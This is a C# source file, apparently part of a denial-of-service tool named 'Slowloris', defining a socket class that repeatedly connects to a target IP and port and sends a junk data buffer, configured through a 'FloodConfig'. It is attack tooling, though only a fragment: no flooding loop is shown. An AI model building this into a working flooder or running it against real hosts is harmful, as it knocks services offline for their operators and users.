using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Slowloris
{
    public class ProxyServer :IDisposable
    {
        public IPAddress IpAddress { get; }
        public int Port { get; }

        private IPEndPoint Host { get; }

        private Socket Socket { get; }

        private readonly byte[] buf;
        public ProxyServer(FloodConfig config):this(config.Ip,config.Port,config.NoDelay,config.Blocking, config.Delay) {}

        public ProxyServer(string ipAddress, int port): this(ipAddress,port, true, false, 10){}

        public ProxyServer(string ipAddress, int port, bool noDelay, bool blocking, int delay)
        {
            this.IpAddress = IPAddress.Parse(ipAddress);
            this.Port = port;

            this.buf = Encoding.ASCII.GetBytes("data vjkdslsjdfhsdhflkjsdbhsdbifuaehiulrcewncWCEHNOUEWH EHUICNRIHAESIOFCNHAWOIU EFWHUIFCHNAXAUF HEWIUIFHASUOXFHASDFHLASEMFXJSA EWHUIXFJASDHFUASCNFMLXJEK LEHFLAMSLDALEH KUHEUSKFJBSDFJSD");

            this.Host = new IPEndPoint(this.IpAddress, this.Port);

            this.Socket = new Socket(this.Host.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
            {
                NoDelay = noDelay,
                Blocking = blocking
            };
        }

        public bool TryConnect(int timesToReconnect)
        {
            bool result = false;

            for (int i = 0; i < timesToReconnect; i++)
            {
                try
                {
                    this.Connect();

                    result = true;

                    break;
                }
                catch (Exception)
                {
                    Console.WriteLine($"Reconnecting... ({i + 1})");
                }
            }

            return result;
        }

        public void Connect()
        {
            this.Socket.Connect(this.Host);
        }

        public int Send() => 
            this.Socket.Send(this.buf);

     

        public void Dispose()
        {
            this.Socket?.Dispose();
        }
    }
}